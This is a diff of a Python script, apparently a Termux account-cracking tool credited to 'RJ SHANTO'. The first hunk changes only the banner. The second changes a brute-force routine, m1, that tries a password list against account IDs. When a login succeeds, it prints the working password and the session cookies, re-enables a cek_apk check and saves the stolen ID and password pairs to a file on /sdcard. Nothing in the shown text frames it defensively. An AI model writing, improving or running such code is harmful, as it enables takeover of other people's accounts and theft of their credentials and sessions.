@@ -112,18 +112,18 @@ logo =("""          \033[1;37m____ \033[1;32m                       \033[1;37m__
    ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
    ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
                                             \033
-======================================================
+===============================================
   
   Auther   :  RJ SHANTO
  
   Github   :  SHANTO-KING
 
-  Facebook  : SH AN TO 
+  Facebook   : SH AN TO 
 
-  Version    : 0.01
+   Version   : V-1
 
-  WhatsApp: 01310868***
-======================================================\033[1;37m""")
+  WhatsApp   : 01310868***
+===============================================\033[1;37m""")
 
 def linex():
         print(47*'\033[1;31m=\033[1;37m')
@@ -230,10 +230,9 @@ def m1(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [SH4N7O\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
-                                #cek_apk(session,coki)
+                                cek_apk(session,coki)
                                 print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
-                                open('/sdcard/SH4N7O_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');
-                                open('/sdcard/SH4N7O_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                                open(f'/sdcard/SH4N7O•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in SH4N7O:
